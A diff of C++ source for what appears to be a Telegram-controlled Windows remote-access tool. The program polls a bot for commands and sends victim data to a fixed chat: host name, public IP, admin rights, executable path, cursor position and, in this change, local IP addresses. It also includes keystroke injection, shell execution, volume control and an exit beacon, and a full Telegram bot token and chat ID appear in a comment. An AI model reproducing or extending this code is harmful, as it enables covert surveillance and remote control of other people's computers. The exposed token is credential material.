@@ -1,48 +1,85 @@
 #include <iostream>
 #include <string>
 #include <fstream>
-#include <windows.h>
 #include <mmdeviceapi.h>
 #include <endpointvolume.h>
 #include <vector>
 #include <atlimage.h>
 #include <winternl.h>
-#include <winsock.h>
+#include <winsock2.h>
+#include <iphlpapi.h>
+#include <ws2tcpip.h>
 #include <iomanip>
-#include <opencv2/opencv.hpp>
+#include <opencv2/opencv.hpp> 
 #include <nlohmann/json.hpp>
 #include <cpr/cpr.h>
+
+#pragma comment(lib, "Iphlpapi.lib")
+#pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "Shlwapi.lib")
+#define WIN32_LEAN_AND_MEAN
+#include <windows.h>
 
 using namespace std;
 using json = nlohmann::json;
 using namespace cv;
 
 string ID;
-const string botApi = ""; //https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
-const string chat_id = "-1001655582641";
-const string VERSION = "beta v0.2.4";
-const vector <string> constants = { "$UPTIME$","$EXE_NAME$","$HOST_NAME$","$PUBLIC_IP$","$ADIMN_RIGHTS$","$EXE_PATH$","$CURRENT_VOLUME$","$CURSOR_POSITION$","$VERSION$" };
+const string BOT_API = ""; //https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
+const string CHAT_ID = "-1001655582641";
+const string VERSION = "beta v0.2.5";
+
 
 inline bool filexits(const string& name) {
     struct stat buffer;
     return (stat(name.c_str(), &buffer) == 0);
 }
+string uptime(); string get_exe(); string get_path(); string hostname(); string public_ip(); string admin_rights(); string Cursor_Position();
+const vector <pair<string, string(*)()>> constants = { {"$UPTIME$",uptime},{"$EXE_NAME$",get_exe},{"$HOST_NAME$",hostname},{"$PUBLIC_IP$",public_ip},{"$ADIMN_RIGHTS$",admin_rights},{"$EXE_PATH$",get_path},{"$CURSOR_POSITION$",Cursor_Position}};
+void Send(string);
+
+json bad_json() {
+    json jd;
+    jd["message_id"] = 69;
+    jd["date"] = -1;
+    return jd;
+}
 
 json GetLastMessage(){
-    auto response = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + botApi + "/getUpdates?last=1&offset=-1" });
+
+    auto response = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + BOT_API + "/getUpdates?last=1&offset=-1"});
     string s = response.text;
     if(!s.empty())  s = s.substr(21, s.size() - 23);
     if(s.empty() || s=="\n") {
-        json jd;
-        jd["message_id"] = 69;
-        jd["date"] = -1;
-        return jd;
+        return bad_json();
     }
+    for (int i = 0; i < constants.size(); i++) {
+        int pos = s.find(constants[i].first);
+        while (pos != string::npos) {
+            string buff = s.substr(0, pos);
+            buff += constants[i].second();
+            buff += s.substr(pos + constants[i].first.size(), 4096);
+            s = buff;
+            pos = s.find(constants[i].first);
+        }
+    }
+    static bool somethingwentwrong = false;
+    json j;
+    try {
+        j = json::parse(s);
+    }
+    catch (json::parse_error& e)
+    {
+            cerr << endl<< endl <<"message: " << e.what() << '\n'
+            << "exception id: " << e.id << '\n'
+            << "byte position of error: " << e.byte << std::endl;
+            if (!somethingwentwrong) Send(ID + " something went wrong with parsing to json");
+            somethingwentwrong = true;
 
-    json j = json::parse(s);
-    j = j["channel_post"];
-    return j;
+            return bad_json();
+    }
+    somethingwentwrong = false;
+    return j["channel_post"];
 }
 
 int ChangeVolume(double nVolume=-1, bool bScalar=0)
@@ -98,7 +135,7 @@ void setID(string newID)
     file.close();
 }
 
-inline void press(char a, bool bigone = 0)
+void press(char a, bool bigone = 0)
 {
     if (bigone) {
         keybd_event(VK_SHIFT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
@@ -162,7 +199,7 @@ string url_encode(const string& value) {
 
 void Send(string to_send) {
     while (!to_send.empty()) {
-        cpr::Response r = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + botApi + "/sendMessage?chat_id=" + chat_id + "&text=" + url_encode(to_send.substr(0,4095)) });
+        cpr::Response r = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + BOT_API + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + url_encode(to_send.substr(0,4095))});
         to_send.erase(0, 4095);
     }
 }
@@ -178,6 +215,70 @@ string exec(const char* cmd) {
         result += buffer.data();
     }
     return result;
+}
+vector<pair<string, string>> LocalIp;
+void ListIpAddresses() {
+    IP_ADAPTER_ADDRESSES* adapter_addresses(NULL);
+    IP_ADAPTER_ADDRESSES* adapter(NULL);
+
+    DWORD adapter_addresses_buffer_size = 16 * 1024;
+
+    // Get adapter addresses
+    for (int attempts = 0; attempts != 3; ++attempts) {
+        adapter_addresses = (IP_ADAPTER_ADDRESSES*)malloc(adapter_addresses_buffer_size);
+
+        DWORD error = ::GetAdaptersAddresses(AF_UNSPEC,
+            GAA_FLAG_SKIP_ANYCAST |
+            GAA_FLAG_SKIP_MULTICAST |
+            GAA_FLAG_SKIP_DNS_SERVER |
+            GAA_FLAG_SKIP_FRIENDLY_NAME,
+            NULL,
+            adapter_addresses,
+            &adapter_addresses_buffer_size);
+
+        if (ERROR_SUCCESS == error) {
+            break;
+        }
+        else if (ERROR_BUFFER_OVERFLOW == error) {
+            // Try again with the new size
+            free(adapter_addresses);
+            adapter_addresses = NULL;
+            continue;
+        }
+        else {
+            // Unexpected error code - log and throw
+            free(adapter_addresses);
+            adapter_addresses = NULL;
+            return;
+        }
+    }
+
+    // Iterate through all of the adapters
+    for (adapter = adapter_addresses; NULL != adapter; adapter = adapter->Next) {
+        // Skip loopback adapters
+        if (IF_TYPE_SOFTWARE_LOOPBACK == adapter->IfType) continue;
+
+
+        // Parse all IPv4 addresses
+        for (IP_ADAPTER_UNICAST_ADDRESS* address = adapter->FirstUnicastAddress; NULL != address; address = address->Next) {
+            auto family = address->Address.lpSockaddr->sa_family;
+            if (AF_INET == family) {
+                SOCKADDR_IN* ipv4 = reinterpret_cast<SOCKADDR_IN*>(address->Address.lpSockaddr);
+                char str_buffer[16] = { 0 };
+                inet_ntop(AF_INET, &(ipv4->sin_addr), str_buffer, 16);
+
+                wstring shit(adapter->FriendlyName);
+                string normal(shit.begin(),shit.end());
+
+                if (normal == "Ethernet" || normal == "Wi-Fi") {;
+                    LocalIp.push_back({normal,str_buffer});
+                } 
+            }
+        }
+    }
+
+    free(adapter_addresses);
+    adapter_addresses = NULL;
 }
 
 BOOL IsProcessElevated()
@@ -216,7 +317,7 @@ string uptime() {
     int uptime_m = ((double)clock()) / CLOCKS_PER_SEC / 60;
     uptime_m -= uptime_h * 60;
     if (uptime_m < 0)uptime_m = 0;
-    return to_string(uptime_h) + "h" + to_string(uptime_m) + "m" + '\n';
+    return to_string(uptime_h) + "h" + to_string(uptime_m) + "m";
 }
 
 string hostname() {
@@ -243,17 +344,22 @@ string Cursor_Position() {
 string getStatus() {
     string status;
 
-    status = "uptime: " + uptime();
+    status  = "uptime: " + uptime() + '\n';
     status += "exe_name: " + get_exe() + '\n';
     status += "host_name: " + hostname() + '\n';
-    status += "public_ip: " + public_ip(); +'\n';
+    status += "public_ip: " + public_ip() +'\n';
+    status += "local_ip: \n";
+
+    ListIpAddresses();
+    for (auto i : LocalIp) {
+        status += "  " + i.first + ": " + i.second + "\n";
+    }
     status += "admin_rights: " + admin_rights() + '\n';
     status += "exe_path: " + get_path() + '\n';
     status += "Current_volume: " + to_string(ChangeVolume()) + '\n';
     status += "Cursor_Position: " + Cursor_Position(); + '\n';
-    
-    status += "\nversion: " + VERSION + '\n';
 
+    status += "\n\nversion: " + VERSION + '\n';
     return status;
 }
 
@@ -416,8 +522,9 @@ double time_lenght (time_t start, time_t stop) {
     return (double)(stop - start) / CLOCKS_PER_SEC;
 }
 
+bool not_error = true;
 void atexit_handler() {
-    Send(ID + " error, quiting...");
+    if(not_error)Send(ID + " error, quiting...");
 }
 
 void startup() {
@@ -434,7 +541,6 @@ void startup() {
 
     string s = get_path() + "update.bat";
     if (filexits(s))remove(s.c_str());
-
     atexit(atexit_handler);
 }
 
